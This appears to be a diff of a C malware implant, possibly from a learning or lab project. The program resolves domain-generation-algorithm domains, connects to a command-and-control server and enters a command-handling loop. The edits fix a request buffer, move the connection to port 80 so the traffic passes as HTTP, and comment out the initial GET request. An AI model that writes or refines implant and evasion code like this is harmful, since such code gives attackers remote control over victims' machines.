@@ -18,7 +18,7 @@
 int sendGetRequest(int* client_fd)
 {
     int status = 0, bytes_sent = 0;
-    char getRequest [30] = { 0 };
+    char getRequest [100] = { 0 };
     char *reqString = "GET /resource HTTP/1.1\r\nHost: not.malware\r\nContent-Type: text/plain\r\n\r\n";
 
     memcpy(getRequest, reqString, strlen(reqString));
@@ -29,6 +29,12 @@ int sendGetRequest(int* client_fd)
         printf("Failed to send HTTP GET request to C2!\n");
         status = 0;
         goto cleanup;
+    }
+
+    // Otherwise success
+    else
+    {
+        status = 1;
     }
 
 
@@ -200,7 +206,7 @@ cleanup:
 int main() 
 {
     char* ip_address;
-    uint16_t port = 1337;
+    uint16_t port = 80; // going to act like we're sending HTTP traffic 
     int client_fd = 0;
 
     printf("Generating DGAs and resolving domain names...\n");
@@ -219,15 +225,15 @@ int main()
         return -1;
     }
 
-    printf("Successfully connected to C2; sending HTTP GET request...\n");
+    /**printf("Successfully connected to C2; sending HTTP GET request...\n");
     if (!sendGetRequest(&client_fd))
     {
         printf("Failed to send HTTP GET request!\n");
         return -1;
-    }
+    }*/
 
     // GET request succeeded, continue to handle commands
-    printf("Successful GET request; continuing implant loop...\n");
+    //printf("Successful GET request; continuing implant loop...\n");
 
     if (!handleCommands(&client_fd))
     {
